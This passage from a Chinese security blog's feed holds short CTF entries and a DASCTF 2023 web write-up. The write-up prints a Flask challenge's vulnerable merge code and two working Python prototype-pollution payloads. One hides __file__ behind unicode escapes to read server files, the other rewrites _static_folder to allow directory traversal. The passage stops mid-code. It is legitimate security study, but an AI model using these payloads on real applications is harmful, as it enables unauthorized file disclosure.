不然会报错</p><p><strong>最后完成的文件结构图</strong></p><p><img src="../images/image-20230731145619175.png" alt="image-20230731145619175"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t ctf:v1 .   </span><br></pre></td></tr></table></figure><p><strong>生成镜像</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 8080:80 -e 镜像id</span><br></pre></td></tr></table></figure><p>运行该镜像   </p><p>这样就能成功的将环境起起来了</p><h3 id="外网部署"><a href="#外网部署" class="headerlink" title="外网部署"></a>外网部署</h3><p>直接将文件发给自己的服务器上  然后执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>这样就可以将题目成功的部署在外网上了</p><p><img src="../images/image-20230731150347683.png" alt="image-20230731150347683"></p><p>(要记得开启题目所需的端口   不然可能会访问失败)</p><p><img src="../images/image-20230731150438136.png" alt="image-20230731150438136"></p><p>这样就部署成功了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里写这个的话主要是为了记录这个&lt;strong&gt;学习&lt;code&gt;docker&lt;/code&gt;的过程&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/YBaog/article/details/125349766&quot;&gt;参考文章1&lt;/a</summary>
      
    
    
    
    
    <category term="Docker" scheme="https://ke1nys.github.io/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>show-Python反序列化</title>
    <link href="https://ke1nys.github.io/posts/78e9e0c1.html"/>
    <id>https://ke1nys.github.io/posts/78e9e0c1.html</id>
    <published>2023-07-29T15:34:42.000Z</published>
    <updated>2023-08-17T09:33:39.340Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="bfc3084065846ef3a57d7d0c25fc1a1dd0aa484ad8cccc2a82311f856c29a666">1a90164da2a38547586d85c848ea2323d762a3ffb367be5a4c22b191df8c9b7c3982a2e7b92a0b91b3f9bc979ba8e671a8d0cc06fe3aac9ec976bfc329f9a0901cecb781dcece9b667c68af84eeb7bdb236bd10bfbabd929b84c2259d527412eb962fff47e5641d35b42d9ded0e3333459cbcac5ddbbce906d3082c62854c9f5a6e8ea3a73727d4b4510319d12e8786d8b2f16166a48fd57ae00782b7e0c9a075eae8e2f9f833e26d011a3b26ca5c38e42d40898ef4ae4b0934d9446952bd67b1c0657e09544e71ab44b2ed9c09216fb4795da01248a337172fc414fa7c655bdf013695d0dfeeaa14aaedd0a7b01a0cd97c20bbe8a1b2f8718521f29780e3673b78a04de1c72e0f2bf9d513d605de9c6661c0600fd013f92abce148f227391e6a875ae259945f97a7e646a8fdea528c542bb2111997348320891a92890f5f2bc297799194203975b9e4437ec47c36b33351a81047a73b57d5b1db331649e1a66f7912ef50d396d3040f305e69dc1e60ace4db1d9793f62450d8fcc6d0869897eff58d9ef86bdf7e47aec229053e66896d55ce70455f7928e414eeb57b3bbd8eeb225bd972f68a58eca4d148fb81a600e1acec95cb4511e2503238909e88dd532d0360a924e78664af16d237d262267cbad5a52c652eafd79caa1317225ec4c8e613832c47845a2addf76c1adff66f31b18641a62892254481c3136caa824114c42c8c7541f5366a3fd9297f17baa0f1ebeea0ab924a8ef97168ee31eaca4c47032e2fbdcd2933df1222f30f724ddc1b92ebbb86e1bda077e98d44e17b057cd98bb08f20edcf7e382d29d79c615c1256a61eae683088097f0c32ea7ba7a08522acaa6d762a95e85392a7758e49fd9bbd7e925fff8b1b28731183c8be580f3eb57bfa9dea6690f8bac24621435358c397ada106d44b2a3d47f9e78a4fc465265f88792b646d6891d32c8eb2758dc7c8fe6e879e24fe055fe2484b25c02842a3f3b05ac0a6439a336f9d88a7c0ee3f888201fc001653243d387694fc77bfa48a2afedf6b81cdee4958419f85b7f91b6cae2062a4352df61a58858e284de2b420a98bc1c8a8468e659c22cec476f04f84cf02ef2e6fc6575c559c3c702d55b67d0665f7c284ad25c80e4692b110e8b88f6ae5e8919d1c3e5441f7be0d168ca3438e41cbe6e80ead61aeff73fde29784da5cd880a23cd0721b70da954f7c21ba10988e616cc6148ab65b5e43a5a3997d39e3786a45a000427d18e9be7b9f8e816bd2892d7fbf9919bf5171bf354a0934bc9176858143412bb7a6fa5db10e434f19bf4af43139881cbd73ed319d58cb1e00dce9fd634527c110a645c95fa5eddd0d9209b922cdca5ccc95125d0b085f99569f8c05ba70de81ad48dd80ac635028f044060b0e356ce9395257581e45e5cd144cd1e797b3cd0a67a650b0f8211291270b37ac2ba15a477acd78fa76f5d1dcafd0a23862a1fdabaec5699b43cbaf27a621c87db76571cbf11e0f4befe4ecd8e123ea97229bf14832d73705aaa67816ec9372cb81bcd2f02700e5c924bca2eaebdcf29a2b5ec9e1ff33ed25d8d59ec00b7ad3a12b9508536bc58c8442ee5422d5c046388c90ac46e07bc1f0e06091af07d2b09a8d817c01cbe621a0ba785bba7f9f74f72219ed2a1e15ff1e9c202f4cf1d26c3d7bd355fc1aa98a0d2bba6738b5b856c85f87bda85d815e7bec6efd1a273e396ba5db40936a92f61aca7ff54cb49cdd258508486ac845ccfa5f01323b035327122a4f114e63ef3e94823643304a8d2570282891c2cf4d2f43f0c19c21823b2f7fe55d2ebcfd2a4015db7c306b3b19646323bd3b2580b5182ccbd3fe28945d961872614abda10374137179084ae03b0d891a728c34e4f6e68823b94f618b23cbd5f533909146027b7563c4bde001dc5a0ad3753488ddf83824fdd78768295686f53aa1fc64b02952365bd35251f7428e8995231fe510a9cd10852be20a915336e40a160ad95d13f8a5dc9fcadd47d645e6ead3c7785646e9419cc1f28134572d94440b19e8ca2a7b1e85eeea79dfbb6272dc8b3313aede4265250f9f687fae61ba717882f1ca14e0aace97d7b6466c536e5eccaf14485070b6a4d6fb2914cb40b946bdd34107228612133ccca938b01fb7ad3ebb438145e8d5c0ccdd04b090f5ad5c80683c1bfcb094032cbc021accc6fc5f92b2cc0b2fb7be8dae3be378c86a4ad8b152adbcf9db2e705608016e9ee068a400ecf68adf09b5c9b2188bc8a7308f9bd040da97a1da856e2114a762b70d3cc3e672a2fa3e4756a610de17360d9ffcce5c0e44698d7cd0bf716cacf869cb8b2d702d688ddee1ff5247790ef43e1278398d6948f007b8c082ed384c5a74c0b95bd87daea98a46ef01e0724b89504622396988e038321a860fe004acfb27b33eceeaa2a1cee13000f81e35a181fec0c9063ae936b32dd902ca4e84677c88d0e706a41cbdb16b8f26b5981fdbae6810c7772865f4510fac85d14061b549e382f7131e9772f3c76ae9d8c39b0b2ea4c11bfa9c051cf12afdf5f484bf43bd5c255c44495bf244a7c07e130ab477c2b33005be76c31a112525f590fc8dd50acbc6568a6bf3af4c2c53dfd0f84113f905b2cf65467b1fa6c2377968c5dd7def6f1d8a7d1556e36fb622e3d48f65250b3ae90c6cd1c7c2605aa7801c5df5bb00c5c8fc164c15170fe4ccef59fb4d4f06be2fd5558497ae1b155b0de50c6c4b2d4ab6fc5c3ccbd65dbc2603837d05c0ffa34c64ab557ac13dd1e633c7fbbeb34805e69325aaea45c153ca2aa5e6e32b96ad04a8bd1c9ad2cc2ce6dd82dd29f48769a1ed16b12e7902681dd968a91cc8f2faef9a86f6d8e05007a8f671cd60bb1c8da64c17134def2077475248a5688d6e89dcbcbd737a0c36ba86f8f057db8dd8c38375a068104f7bd51a931caf2a45451420b75d65b8c525cda82f666f4c8a2b4bbe018cf18304d1613fdf16c5fc192cb33ef566d446ad02fb9b22f1585bce728c316ca574280e0aed3082e456a4b560c1a566d5fec1766dcb26fd891deae9b3e3553f33f77e15c85eab91ad1dc3037a04987b9e0c43e310a9132a05413d77328caca82ae7150fd43f2f9a4936d481121b76c9c71363e4caeadeda7a87b961d2f571b0655ba99f0b02ac983de7d67408a9010eab158a66a823224991d6dbd53509c3353eeca7806fb505682f9c568a2d94866fc6bdb10d1e626365925720a8dae5521c14afa13d40402dd937825f99af3841629caca4be5039bb16d43be852487ba365c040e89f5e5fa47907badfdc3fc3fcfdad4fb800f760f8821afc1b0515254140729b508730a04cd155eebb46765df8b024a655f6822525394f4058932e592abb216f816984319d31529965c27d2e15e5027a5ee5b7c1a688d3a8a30a03a113a15ef79d17838508babab214a7ed317ec176a436c621b6b6d91ecb1b9ce9d74d4bb7264d8d8c6c87764a8438661a03d28644c584d472c287e58ec01c58c69bd9516ba65db9d903eb55fc7c8c6d1fc3cf49c64176e44b26ee22b21a216fac6f674d6c4a7bed269c9ba4d73a4cba3ce1fe9d28861faece5409d74e25c58e2f8a647b62f5c7335b5921edf324d4a90ddd868d865550254e060036abbc67746afd0d88c5f83a69730449a725903a0d913b87bff542e93287fcfdb454b6e550bc4ca8f0c9790898b3ff0e0f67885d55b6539744541086dcd7bbe37b745e0cb2393882dc4a7855dd485a3df2f82d4fcd3c03814e58865b6571e60d0888c5a7b239ee2de1bb6ac74336641d9b3ebecb0d891873aa9f7fc90ef0819cb34028fb1414a446dcb05e06da121b0cfcfa6ba9b7e1bad0415afeae6a770a9f3eea3d95aadbaa1a767d9e0db3c1efd12c5f7b0e840a3176dba66fcdb02a0f218ac27b0b61d341f790e54cc0a52d05f72999199411d65422a645856e1eee4f30d9e828643f53ada579caa81639be5d51debdc94831a9a4c8718bd26cf6996bb3c2f9557bc55e2e6d3c01250134c433d0823fe681d65545628d170393ed145250c4d908df951979c77220fbd9ade174ebe3a67ecdbf712e168c27f61d80b86524ba4865032f8b11dcf020e62a280e356cb840042462670868ba4e859ee31ac1372667e6dbf1923a1f8363f1ffbefffdb30c4578544db7a3264fc06ece8d426353c98d32ab38d6b8c898a496f515742c71868e10f9d325b1b7b2077f97ad9f75d9caa69c924635e0fd0c7d4ad872db4f98986524a690460fe3515f4ac05616267e649293662d45331e1040b5001512a03c3e0344ec6d6920c63cb26915a68851a912d73dc98e680bf4403e4d403001f5a3c172b2b5034a990ad7a4403e0450520a8381b11e97ebd747c4442e7c5d8cd10734867d129897c6a94e9ba030638cd0043b401e8d55cc76a6da959658e23137cea7e08d47275f6e12615ca3aa8f0caff35b4440d9c80eda693f80df223a13a0f70a6fcbb5b433b7dddc2444009b6bf0a5043b5d68e5acd7babdfc77709750f1bc63961658979c27392861bed14d522016997e148cb52b45930aff5c9651ec7478ca81c20b5f1a4260edc804a2c6fea9c4fc9b06b3bf0a870b3c5fb92dd36964d36379363890fd9a089c0b1d5217228b9da3076c090ccf08aea1ae91741b6a386a3d51b32f7e9bb56acd0014626375ad9e1cdf5ec5d717d1e7fa29b8369da0e7e7c5391f148cd2993de352412e1676f8a713db10856199b0198ccec95aea703daab701fe8be9e00216e8b9c5456c66fca53e001e024b7d98d7b97642e4a4704933adf125dd3209455db5418ac2fe2b14855215ed8d53bcbc6f975399e28254f5d5bcee7f391d03006d6a17afa3683cecdea92de8a3cfcec55580241e3d3ebf702383325d11bb6204bb49d27d25b0387f86addd96191e17c583c3c8474a28c89d0154709aabe4b7e0818e3735d95070af0d7909cddd6456e85973a48b163a352be0c1695ac1ab3a55c021623d1da05ad6351037d61cad45bcdf68b68249a76a898a7f6ac7c86c55f3e73dd55893659021b84dbea8ca1ccf18e6eb0481e2dd45c0a4b98ec8d6ea78d43f12cc6ce7a045844d1ef31574d10a394c3d5ad9321bff98e33f41440cf7ff951773c134e56cdbf9529e5f3913001c1cb628f7218f0867543eb0a3821cc0e115576ff24c2bbab1b097dcca65aa837493eee1ef2f20af6c747405dca0ded756dce78858a65b3aa41e3f86d1dcbd58a920dc6a0a48fcd09fefdedc181c1201b6c3960dd334add94263d490fd53528fda09a819a39edf52063deccba01b65a0037e3bc24872344d123d6f4d9516c461cddfa3c53730f397a07df1cf86f0f7b348ec2356905774afb5c7f1b144482d3ea54854fb91c8bc68bb880f9dc713a562cfc895c3b78cf45b8fefd14dbf6c7452dcf4110f58930b5953e2a0e0e451c24c5f6cf3d916de7b38d65fda797c8c34182b007f79cc8604773af7f4c41432ae2e9933c9b532088f4c82d0f3dd399bdf330fa893b255d03a884ab10b894408834817d519f1947bd43f455ac3de00f534191914a586245f11c3760693a7c80e016373bb6307e895537fbfaa322bc61f117fe9119863fec8a23105f0521b4d40480f16f96b15deafdb47cde72bdb7da7d63b60e504869f0360e57dc83ed08dcea6e9a970389e9cb1f59900fc143317aecbe60de70b6790092a2dd580c3310f6998c2c821dfa2c592a71de32250da48776a2f18a2a0b4062d61453d23db68c7d935ded1a68</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这是一篇加密文章，需要密码才能继续阅读。</summary>
    
    
    
    
    <category term="show-Python反序列化" scheme="https://ke1nys.github.io/tags/show-Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Python原型链污染</title>
    <link href="https://ke1nys.github.io/posts/6893ad0d.html"/>
    <id>https://ke1nys.github.io/posts/6893ad0d.html</id>
    <published>2023-07-26T06:31:25.000Z</published>
    <updated>2023-07-29T08:13:42.299Z</updated>
    
    <content type="html"><![CDATA[<p>写这篇文章是为了占位  </p><p>因为比赛的时候刚好遇到这里不会</p><p><img src="../images/image-20230726143731499.png" alt="image-20230726143731499"></p><p><a href="https://tttang.com/archive/1876/#toc__1">python原型链污染详解</a></p><p><code>Web -EzFlask</code>    这道题考察到了  </p><p>关于这道题的解在博客直接搜索这个比赛的wp就能看到了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;写这篇文章是为了占位  &lt;/p&gt;
&lt;p&gt;因为比赛的时候刚好遇到这里不会&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20230726143731499.png&quot; alt=&quot;image-20230726143731499&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href</summary>
      
    
    
    
    
    <category term="Python原型链污染" scheme="https://ke1nys.github.io/tags/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    
  </entry>
  
  <entry>
    <title>XXE-xpath注入</title>
    <link href="https://ke1nys.github.io/posts/9d9aaae5.html"/>
    <id>https://ke1nys.github.io/posts/9d9aaae5.html</id>
    <published>2023-07-26T06:30:56.000Z</published>
    <updated>2023-07-29T08:13:42.300Z</updated>
    
    <content type="html"><![CDATA[<p>这里这篇文章是为了占位  </p><p>因为有个比赛考到了   刚好我不会  所以写篇文章来占位一下   方便下次自己好查阅</p><p><img src="../images/image-20230726143326525.png" alt="image-20230726143326525"></p><p><strong>考点是xxe的xpath盲注</strong>  </p><p><a href="https://www.cnblogs.com/backlion/p/8554749.html">xpath详解</a></p><p><a href="https://boogipop.com/2023/03/06/XXE%E6%B3%A8%E5%85%A5%E7%9A%84Remake%E4%B9%8B%E6%97%85/">xxe和xpath详解</a></p><p><code>WEB -MyPicDisk</code>       这道题考察到了</p><p>wp的话在这个比赛的wp上 </p><p>直接在博客上搜索就行</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里这篇文章是为了占位  &lt;/p&gt;
&lt;p&gt;因为有个比赛考到了   刚好我不会  所以写篇文章来占位一下   方便下次自己好查阅&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20230726143326525.png&quot; alt=&quot;image-202307</summary>
      
    
    
    
    
    <category term="XXE-xpath注入" scheme="https://ke1nys.github.io/tags/XXE-xpath%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF 2023 &amp; 0X401-Web</title>
    <link href="https://ke1nys.github.io/posts/46437d33.html"/>
    <id>https://ke1nys.github.io/posts/46437d33.html</id>
    <published>2023-07-25T06:51:45.000Z</published>
    <updated>2023-07-29T08:13:42.295Z</updated>
    
    <content type="html"><![CDATA[<h2 id="EzFlask"><a href="#EzFlask" class="headerlink" title="EzFlask"></a>EzFlask</h2><p><a href="https://tttang.com/archive/1876/#toc_object">python原型链污染</a></p><p><img src="../images/image-20230725145530694.png" alt="image-20230725145530694"></p><p><strong>提供源码  开始审计</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> self.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> self.password == data[<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">Users = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)</span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> Users:</span><br><span class="line">                <span class="keyword">if</span> user.check(data):</span><br><span class="line">                    session[<span class="string">&quot;username&quot;</span>] = data[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Login Success&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5010</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230726100732339.png" alt="image-20230726100732339"></p><p>重点是这里  访问根目录的时候会读取我们的内置方法  <strong>(<code>__file__</code>)</strong></p><p>这里的话我们就可以通过污染这个<strong>内置属性</strong> 来指定我们想要读取的文件</p><p><img src="../images/image-20230726101131131.png" alt="image-20230726101131131"></p><p>就是在/<code>register</code>这个路由下  传入我们恶意构造的<code>json</code>语句</p><p>(<strong>这里有疑问的也可以去看看文章开头给的那篇文章)</strong></p><p>但是直接用文章给的<code>payload</code>是打不了的   因为有fuzz  但是因为这个<code>python</code>的<code>paylaod</code>和<code>ssti</code>差不多   所以可以使用编码来进行绕过</p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;</span>:&#123;<span class="string">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span>:&#123;<span class="string">&quot;\u005f\u005f\u0066\u0069\u006c\u0065\u005f\u005f&quot;</span>:<span class="string">&quot;/proc/self/cgroup&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230726101709961.png" alt="image-20230726101709961"></p><p>然后访问根目录  </p><p><img src="../images/image-20230726101758153.png" alt="image-20230726101758153"></p><p>这是个非预期解  </p><p><strong>其实看了文章开头给的文章的话  还可以污染另一个内置方法来直接读取文件</strong></p><p><img src="../images/image-20230726102006243.png" alt="image-20230726102006243"></p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__init\u005f_&quot;</span>:&#123;<span class="string">&quot;__globals__&quot;</span>:&#123;<span class="string">&quot;app&quot;</span>:&#123;<span class="string">&quot;_static_folder&quot;</span>:<span class="string">&quot;/&quot;</span>&#125;&#125;&#125;,</span><br><span class="line"><span class="string">&quot;username&quot;</span>:<span class="number">1</span>,</span><br><span class="line"><span class="string">&quot;password&quot;</span>:<span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是通过污染<code>_static_folder</code> 这个属性   <strong>来将当前目录设为根目录</strong></p><p>然后就可以直接进行目录穿越了</p><p><img src="../images/image-20230726102943214.png" alt="image-20230726102943214"></p><p>然后直接开始访问</p><p><img src="../images/image-20230726103038744.png" alt="image-20230726103038744"></p><p>都是可以直接访问的</p><p><img src="../images/image-20230726103154504.png" alt="image-20230726103154504"></p><p>这次比赛好几道题都可以这样来解  就是通过读取这个路径  来看docker的启动的sh文件内容  从而查到flag位置</p><p>就是存在两种可以污染的内置属性(<strong>可能还有其他的  但是我还不知道</strong>)</p><p>因为<code>console</code>开了  预期解是因为污染<code>__file__</code>   然后通过读取文件来算pin 然后再到控制台了读取文件</p><p><strong>(这里就不跟了)</strong></p><h2 id="MyPicDisk"><a href="#MyPicDisk" class="headerlink" title="MyPicDisk"></a>MyPicDisk</h2><p><img src="../images/image-20230726104245789.png" alt="image-20230726104245789"></p><p>万能密码登录  然后看到隐藏文件  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span 